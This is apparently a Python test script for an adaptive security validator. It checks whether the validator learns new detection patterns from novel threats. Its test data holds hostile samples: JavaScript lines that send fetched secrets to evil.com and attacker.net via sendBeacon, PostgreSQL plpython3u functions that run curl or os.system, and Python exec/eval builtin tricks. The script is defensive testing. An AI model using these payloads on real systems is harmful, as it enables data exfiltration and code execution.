#!/usr/bin/env python3
"""
🧠 NOVEL PATTERN CREATION TEST 🧠
Focused test to demonstrate real-time pattern learning from unknown threats.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'tbh_secure_agents'))

from tbh_secure_agents.security_validation.adaptive_security import (
    get_next_gen_adaptive_validator,
    AttackVector,
    ThreatSeverity
)

def test_novel_pattern_creation():
    """Test the system's ability to create new patterns from novel threats."""
    print("🧠 TESTING NOVEL PATTERN CREATION & LEARNING 🧠\n")
    
    validator = get_next_gen_adaptive_validator()
    engine = validator.engine
    
    # Record initial pattern count
    initial_pattern_count = len(engine.enhanced_patterns)
    print(f"📊 Initial Pattern Count: {initial_pattern_count}")
    
    # Novel threats designed to trigger pattern learning
    novel_threats = [
        {
            "text": "import __builtins__; exec(__builtins__.__dict__['eval']('malicious_payload'))",
            "context": {
                "security_level": "standard",
                "user_id": "pattern_learner_1",
                "content_type": "python_code",
                "context_indicators": ["builtin_manipulation", "code_execution"],
                "user_behavior": {"suspicious_imports": True, "eval_usage": True}
            },
            "description": "Python builtin manipulation with exec/eval chain"
        },
        {
            "text": "fetch('/api/secrets').then(r=>r.json()).then(d=>navigator.sendBeacon('http://evil.com/collect',JSON.stringify(d)))",
            "context": {
                "security_level": "standard", 
                "user_id": "pattern_learner_2",
                "content_type": "javascript",
                "context_indicators": ["api_access", "data_exfiltration", "external_beacon"],
                "user_behavior": {"api_calls": 3, "beacon_usage": True}
            },
            "description": "JavaScript API to beacon exfiltration chain"
        },
        {
            "text": "CREATE OR REPLACE FUNCTION evil() RETURNS void AS $$ import subprocess; subprocess.call(['curl', 'evil.com/pwned']) $$ LANGUAGE plpython3u;",
            "context": {
                "security_level": "standard",
                "user_id": "pattern_learner_3", 
                "content_type": "sql",
                "context_indicators": ["function_creation", "subprocess_call", "external_request"],
                "user_behavior": {"function_creation": True, "subprocess_usage": True}
            },
            "description": "PostgreSQL function with subprocess execution"
        }
    ]
    
    print("🔍 PHASE 1: EXPOSING SYSTEM TO NOVEL THREATS\n")
    
    # Test each novel threat multiple times to trigger learning
    for i, threat in enumerate(novel_threats, 1):
        print(f"🧪 Learning from Novel Threat {i}: {threat['description']}")
        print(f"   Input: {threat['text'][:60]}...")
        
        # Multiple exposures to trigger pattern learning
        for exposure in range(1, 4):
            print(f"   📚 Exposure {exposure}:")
            
            # Slightly modify context for each exposure
            learning_context = threat['context'].copy()
            learning_context['exposure_round'] = exposure
            learning_context['user_behavior']['exposure_count'] = exposure
            
            result = validator.validate(threat['text'], learning_context)
            
            print(f"      🛡️  Secure: {result['is_secure']}")
            print(f"      🧠 Anomaly: {result.get('behavioral_anomaly_score', 0):.3f}")
            print(f"      🎯 Confidence: {result.get('confidence', 0):.3f}")
            
            # Check if new patterns were created
            current_pattern_count = len(engine.enhanced_patterns)
            if current_pattern_count > initial_pattern_count:
                new_patterns = current_pattern_count - initial_pattern_count
                print(f"      🧬 NEW PATTERNS LEARNED: +{new_patterns}")
                initial_pattern_count = current_pattern_count
        
        print()
    
    print("📊 PHASE 2: PATTERN LEARNING ANALYSIS\n")
    
    # Analyze what patterns were learned
    learned_patterns = [p for p in engine.enhanced_patterns.values() if p.source == "novel_learning"]
    
    print(f"🧬 NOVEL PATTERNS CREATED: {len(learned_patterns)}")
    
    if learned_patterns:
        print("\n   📋 LEARNED PATTERN DETAILS:")
        for i, pattern in enumerate(learned_patterns, 1):
            print(f"      {i}. Category: {pattern.category.value}")
            print(f"         Severity: {pattern.severity.value}")
            print(f"         Confidence: {pattern.confidence:.3f}")
            print(f"         Pattern: {pattern.pattern[:80]}...")
            print(f"         Context: {pattern.context_patterns}")
            print()
    else:
        print("   ⚠️  No novel patterns were created during this test")
    
    print("🔬 PHASE 3: TESTING LEARNED PATTERNS\n")
    
    # Test if the learned patterns can detect variations
    if learned_patterns:
        print("Testing variations to see if learned patterns generalize...")
        
        test_variations = [
            {
                "text": "getattr(__builtins__, 'exec')(compile('evil_code', '<string>', 'exec'))",
                "description": "Variation of Python builtin manipulation"
            },
            {
                "text": "fetch('/admin/data').then(r=>r.text()).then(d=>navigator.sendBeacon('http://attacker.net', d))",
                "description": "Variation of JavaScript beacon exfiltration"
            },
            {
                "text": "CREATE FUNCTION backdoor() RETURNS text AS $$ import os; return os.system('whoami') $$ LANGUAGE plpython3u;",
                "description": "Variation of PostgreSQL function injection"
            }
        ]
        
        for i, variation in enumerate(test_variations, 1):
            print(f"   🧬 Testing Variation {i}: {variation['description']}")
            
            result = validator.validate(variation['text'], {
                'security_level': 'standard',
                'user_id': 'variation_tester',
                'content_type': 'code'
            })
            
            detected = not result['is_secure']
            confidence = result.get('confidence', 0)
            
            print(f"      🎯 Detected: {'✅ YES' if detected else '❌ NO'}")
            print(f"      🎯 Confidence: {confidence:.3f}")
            
            if detected:
                threats = result.get('threats', [])
                if threats:
                    print(f"      🚨 Classified as: {threats[0]['category']}")
            print()
    
    print("📈 PHASE 4: LEARNING EFFECTIVENESS ANALYSIS\n")
    
    # Analyze overall learning effectiveness
    total_patterns = len(engine.enhanced_patterns)
    novel_patterns = len(learned_patterns)
    evolved_patterns = len([p for p in engine.enhanced_patterns.values() if p.frequency > 1])
    
    print(f"📊 LEARNING METRICS:")
    print(f"   📚 Total Patterns: {total_patterns}")
    print(f"   🧬 Novel Patterns Created: {novel_patterns}")
    print(f"   📈 Patterns That Evolved: {evolved_patterns}")
    print(f"   👥 Behavioral Profiles: {len(engine.behavioral_profiles)}")
    print(f"   📝 Attack History: {len(engine.attack_history)}")
    
    # Calculate learning rate
    learning_rate = (novel_patterns / len(novel_threats)) * 100 if novel_threats else 0
    print(f"   🎯 Pattern Learning Rate: {learning_rate:.1f}%")
    
    # Show behavioral learning
    print(f"\n🎭 BEHAVIORAL LEARNING:")
    for user_id, profile in engine.behavioral_profiles.items():
        if 'pattern_learner' in user_id:
            print(f"   - {user_id}:")
            print(f"     Content Types: {profile.typical_content_types}")
            print(f"     Risk Score: {profile.risk_score:.3f}")
            print(f"     Keywords: {len(profile.common_keywords)} learned")
    
    # Test the system's memory of learned patterns
    print(f"\n🧠 PATTERN MEMORY TEST:")
    print("Re-testing original threats to see if they're now detected...")
    
    detection_improvements = 0
    for i, threat in enumerate(novel_threats, 1):
        result = validator.validate(threat['text'], threat['context'])
        detected = not result['is_secure']
        confidence = result.get('confidence', 0)
        
        print(f"   Threat {i}: {'✅ DETECTED' if detected else '❌ MISSED'} (conf: {confidence:.3f})")
        if detected:
            detection_improvements += 1
    
    improvement_rate = (detection_improvements / len(novel_threats)) * 100
    print(f"\n🎊 DETECTION IMPROVEMENT: {improvement_rate:.1f}% of novel threats now detected")
    
    print("\n✅ NOVEL PATTERN CREATION TEST COMPLETED!")
    
    if novel_patterns > 0:
        print(f"🚀 SUCCESS: System learned {novel_patterns} new patterns from novel threats! 🚀")
    else:
        print("⚠️  System did not create new patterns - may need threshold adjustment")
    
    return {
        'novel_patterns_created': novel_patterns,
        'learning_rate': learning_rate,
        'improvement_rate': improvement_rate,
        'total_patterns': total_patterns
    }

if __name__ == "__main__":
    results = test_novel_pattern_creation()
    print(f"\n📊 FINAL RESULTS: {results}")
